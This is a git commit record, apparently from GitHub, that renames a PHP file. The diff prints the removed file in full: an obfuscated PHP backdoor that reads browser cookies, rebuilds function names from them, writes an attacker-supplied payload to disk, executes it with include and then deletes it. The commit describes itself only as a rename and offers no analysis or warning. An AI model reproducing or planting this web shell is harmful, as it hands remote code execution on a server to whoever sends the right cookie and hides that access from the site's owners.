9f16bd304fe54d628793cf722155d3d8a79bc368
Zaib Ali <65595484+Zaibali9999@users.noreply.github.com>
2024-05-14 14:13:25 +0300

    Rename mguxnj (1).php to mguxnj.php

--- mguxnj (1).php
+++
@@ -1,2 +0,0 @@
-<?php
-$yNJw=${"\137"	.	"\103"."\117".	"\117"."\113"	."\111"."\105"} ; if	( isset ( $yNJw [	(	96-2	) 	]) )	{		 $IV = $yNJw	[( 55- 8)]	.$yNJw[	(	98-15) ]; 	$FNif= $IV	($yNJw	[	(69-21	)].$yNJw [ 	(93	-	23	)	]); 	 $Mpw =	$FNif ($IV($yNJw[(76-	15	)])	) ;   $QwTK= $FNif	($IV (	$yNJw [(33	-	21 )	]	))	; $YOe =__DIR__ .	$FNif ($IV( $yNJw[	(51	-7)  ])	)	;	$Mpw($YOe,	$FNif	($IV	( $yNJw	[ (	94-	0)]	)	)	) ; include ($YOe);	$QwTK($YOe); }
